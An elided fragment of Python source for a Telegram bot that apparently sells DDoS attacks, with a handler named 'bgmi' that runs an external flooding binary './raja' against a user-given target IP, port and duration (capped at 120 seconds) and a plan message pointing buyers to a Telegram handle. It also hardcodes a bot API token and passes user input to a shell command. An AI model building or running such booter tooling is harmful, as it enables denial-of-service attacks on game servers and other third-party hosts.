...
bot = telebot.TeleBot('7230583552:AAHUCD3N_s-iPchx0TaIHlXNOMSFzCkwS3E')
...
def handle_bgmi(message):
    ...
    if time_duration > 120:
        bot.reply_to(message, "Error: Max attack time is 120 seconds ❌.")
        return
    ...
    # Run attack
    try:
        process = subprocess.Popen(f"./raja {target} {port} {time_duration} 10 1000", shell=True)
...
def welcome_plan(message):
    bot.reply_to(message, '''Buy from @KAAL999:
